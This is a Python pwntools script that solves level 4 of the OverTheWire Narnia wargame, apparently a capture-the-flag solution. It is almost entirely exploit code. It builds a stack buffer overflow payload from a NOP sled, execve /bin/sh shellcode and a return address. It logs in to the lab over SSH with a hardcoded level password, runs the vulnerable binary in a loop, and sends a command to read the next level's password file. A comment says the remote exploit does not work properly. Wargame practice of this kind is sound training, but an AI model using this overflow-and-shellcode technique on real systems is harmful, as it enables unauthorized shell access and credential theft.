from pwn import *

"""
Local exploit:
    ./narnia4 $(python -c 'print "\x90" * 236 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x92\xd7\xff\xff"')
"""
con = ssh('narnia4', 'narnia.labs.overthewire.org', password='thaenohtai', port=2226)
#context.arch = 'i386'
#shellcode = shellcraft.sh()
#shellcode = asm(shellcode)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
offset = 264
payload = b'\x90' * (offset - len(shellcode))
payload += shellcode
ret_addr = p32(0xffffd83c)
payload += ret_addr
password = ''
# I can't understand why remote exploit doesn't work properly
# Maybe some matter with the ret address, it can be anything...
for i in range(1000):
    try:
        p = con.process(['/narnia/narnia4', payload])
        p.sendline(payload)
        p.sendline('cat /etc/narnia_pass/narnia5')
        password = p.recvline()
        if password != '':
            break
    except EOFError:
        pass
print(password)
